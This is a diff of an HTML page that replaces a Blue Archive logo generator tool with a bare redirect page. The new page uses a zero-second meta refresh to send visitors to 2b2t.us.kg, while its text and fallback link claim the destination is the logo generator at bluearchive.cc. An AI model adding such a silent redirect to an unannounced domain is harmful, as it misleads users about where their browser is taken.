@@ -1,168 +1,35 @@
-
-<html lang="zh-cn">
+<!DOCTYPE html>
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" type="text/css" href="./fonts/RoGSans_sliced/font.css">
-  <link rel="stylesheet" type="text/css" href="./fonts/GlowSans/font.css">
-  <title class="i18n" data-i18n="title">蔚蓝档案标题生成器</title>
-  <meta name="keywords" content="蔚蓝档案标题生成器,碧蓝档案标题生成器,蔚蓝档案LGOO生成器,碧蓝档案标题生成器,LOGO生成器,标题生成器,Github,github,BlueArchive标题生成器,BlueArchiveLOGO生成器,蔚蓝档案,蔚蓝,bluearichive,weilan,蔚蓝档案官网,蔚蓝档案下载,蔚蓝档案预约,蔚蓝档案新游戏,蔚蓝档案国服,蔚蓝档案攻略,蔚蓝档案视频,蔚蓝档案首曝,蔚蓝档案角色,蔚蓝档案上线,蔚蓝档案始发,蔚蓝档案ios,蔚蓝档案安卓,蔚蓝档案ios,蔚蓝档案安卓,BA,蔚蓝档案PV,蔚蓝档案KV,碧蓝档案,碧蓝,bilan,碧蓝档案官网,碧蓝档案下载,碧蓝档案预约,碧蓝档案新游戏,碧蓝档案国服,碧蓝档案攻略,碧蓝档案视频,碧蓝档案首曝,碧蓝档案角色,碧蓝档案上线,碧蓝档案始发,碧蓝档案ios,碧蓝档案安卓,碧蓝档案ios,碧蓝档案安卓,碧蓝档案PV,碧蓝档案KV,ブルーアーカイブ, ぶるーあーかいぶ, Blue Archive, BlueArchive, Yostar, ヨースター, ブルアカ, ぶるあか">
-  <meta name="description" content="老师，欢迎使用蔚蓝档案-LOGO生成器！">
-  <script type="module" crossorigin="" src="./src/index.js"></script>
-  <link rel="stylesheet" href="./src/index.css">
-  <style>
-    /* 弹窗背景遮罩 */
-    .modal-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      backdrop-filter: blur(8px);
-      z-index: 1000;
-      opacity: 0;
-      transition: opacity 0.3s ease-in-out;
-    }
-    .modal-overlay.active {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      opacity: 1;
-    }
-    /* 弹窗内容 */
-    .modal {
-      background: white;
-      border-radius: 16px;
-      width: 90%;
-      max-width: 400px;
-      padding: 20px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-      text-align: center;
-      position: relative;
-      transform: scale(0.8);
-      transition: transform 0.3s ease-in-out;
-    }
-    .modal-overlay.active .modal {
-      transform: scale(1);
-    }
-    .modal img {
-      width: 100%;
-      max-width: 356px;
-      margin-bottom: -10px;
-    }
-    .modal p {
-      margin-bottom: 10px;
-      font-size: 1rem;
-      color: #555;
-    }
-    .modal button {
-      background: #3b82f6;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 1rem;
-      transition: background 0.3s ease;
-    }
-    .modal button:hover {
-      background: #2563eb;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <!-- 关键跳转代码：0秒后自动跳转到目标网址 -->
+    <meta http-equiv="refresh" content="0; url=https://2b2t.us.kg">
+    <title>跳转中...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+    </style>
 </head>
-
 <body>
-  <header>
-    <h1 class="i18n mt-8 mb-4 text-center font-bold" data-i18n="heading">蔚蓝档案标题生成器</h1>
-  </header>
-  <section class="canvas-wrapper flex place-content-center">
-    <div class="relative my-auto">
-      <canvas id="canvas" height="250" width="900"></canvas>
-      <div id="loading" class="absolute w-full h-full top-0 left-0 backdrop-blur-sm bg-slate-400/5 z-50 hidden">
-        <div class="flex place-content-center h-full">
-          <span class="loading loading-spinner loading-lg mx-auto"></span>
-        </div>
-      </div>
+    <div class="container">
+        <h1>正在跳转到蔚蓝档案LOGO生成...</h1>
+        <p>如果页面没有自动跳转，请 <a href="https://bluearchive.cc/">点击此处</a>。</p>
     </div>
-  </section>
-  <section class="w-full mx-auto my-6 flex flex-col sm:w-[32rem]">
-    <div class="flex justify-center my-4 px-2">
-      <input id="textL" type="text" placeholder="Type here" value="Blue" class="input input-bordered input-md input-primary mr-1 w-40 max-w-[14rem] flex-1">
-      <input id="textR" type="text" placeholder="Type here" value="Archive" class="input input-bordered input-md input-secondary ml-1 w-40 max-w-[14rem] flex-1">
-    </div>
-    <div class="my-2">
-      <label class="cursor-pointer label justify-start mx-10">
-        <input type="checkbox" class="toggle toggle-primary" id="transparent">
-        <span class="i18n label-text text-base ml-4 mr-16" data-i18n="transparent-background">透明背景</span>
-      </label>
-    </div>
-    <div class="mx-6 my-4">
-      <div class="collapse collapse-arrow bg-base-100">
-        <input type="checkbox">
-        <div class="i18n collapse-title font-medium" data-i18n="advance">高级设置</div>
-        <div class="collapse-content">
-          <div class="i18n" data-i18n="halo-cross">光环位置微调</div>
-          <div class="flex justify-evenly my-4">
-            <span class="flex-1"><span class="mr-2">X</span><input type="number" placeholder="Type here" value="-15" class="input input-bordered input-sm input-primary w-32 mr-2" id="graphX"></span>
-            <span class="flex-1"><span class="mr-2">Y</span><input type="number" placeholder="Type here" value="0" class="input input-bordered input-sm input-primary w-32" id="graphY"></span>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="flex justify-evenly my-4">
-      <span><button class="i18n btn btn-primary" id="save" data-i18n="save">保存</button></span>
-      <span><button class="i18n btn btn-primary" id="copy" data-i18n="copy">复制</button></span>
-    </div>
-    <label class="swap cursor-default">
-      <input type="checkbox" disabled="" id="message-switch">
-      <div class="alert alert-success swap-on">
-        <svg xmlns="http://www.w3.org/2000/svg" class="stroke-current shrink-0 h-6 w-6" fill="none" viewBox="0 0 24 24">
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-        </svg>
-        <span class="i18n font-medium" data-i18n="copy-success">图片已成功复制</span>
-      </div>
-    </label>
-  </section>
-
-  <!-- 弹窗 -->
-  <div id="modalOverlay" class="modal-overlay">
-    <div class="modal">
-      <img src="img/BlueArchive.png" alt="蔚蓝档案LOGO">
-      <p>欢迎回来！</p>
-      <p>生成LOGO后别忘了保存哦！</p>
-      <button id="confirmButton">我知道了</button>
-    </div>
-  </div>
-  <script>
-    const modalOverlay = document.getElementById('modalOverlay');
-    const confirmButton = document.getElementById('confirmButton');
-
-    // 打开弹窗
-    function openModal() {
-      modalOverlay.classList.add('active');
-    }
-
-    // 关闭弹窗
-    function closeModal() {
-      modalOverlay.classList.remove('active');
-    }
-
-    // 页面加载时显示弹窗
-    window.addEventListener('DOMContentLoaded', () => {
-      openModal();
-    });
-
-    // 绑定“我知道了”按钮关闭弹窗
-    confirmButton.addEventListener('click', closeModal);
-
-    // 点击遮罩区域关闭弹窗
-    modalOverlay.addEventListener('click', (event) => {
-      if (event.target === modalOverlay) {
-        closeModal();
-      }
-    });
-  </script>
 </body>
 </html>
